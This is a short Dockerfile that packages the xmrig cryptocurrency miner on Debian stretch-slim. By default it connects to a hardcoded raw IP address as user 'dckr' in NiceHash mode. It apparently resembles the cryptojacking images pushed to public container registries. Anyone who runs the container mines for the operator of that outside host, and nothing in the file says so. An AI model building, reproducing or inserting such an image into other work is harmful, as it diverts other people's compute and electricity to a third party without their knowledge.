FROM debian:stretch-slim
COPY xmrig /

ENTRYPOINT ["xmrig"]
CMD ["-o 199.247.8.130 -u dckr -k --nicehash"]
